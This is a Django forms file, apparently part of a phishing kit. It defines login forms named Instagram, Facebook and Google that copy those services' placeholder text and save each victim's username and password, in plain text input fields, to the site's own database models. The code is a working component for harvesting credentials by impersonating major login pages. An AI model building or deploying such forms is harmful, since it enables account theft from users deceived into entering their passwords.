from django import forms
from .models import *
from django.forms import TextInput

class Instagram(forms.ModelForm):
    class Meta:
        model = Instagram
        fields = ('username', 'password')
        widgets = {
            'username': TextInput(attrs={'placeholder': 'Phone number, username, email'}),
            'password': TextInput(attrs={'placeholder': 'Password'})
        }


class Facebook(forms.ModelForm):
    class Meta:
        model = Facebook
        fields = ('username', 'password')
        widgets = {
            'username': TextInput(attrs={'placeholder': 'Email or phone number'}),
            'password': TextInput(attrs={'placeholder': 'Password'})
        }


class Google(forms.ModelForm):
    class Meta:
        model = Google
        fields = ('username', 'password')
        widgets = {
            'username': TextInput(attrs={'placeholder': 'Email, phone'}),
            'password': TextInput(attrs={'placeholder': 'Password'})
        }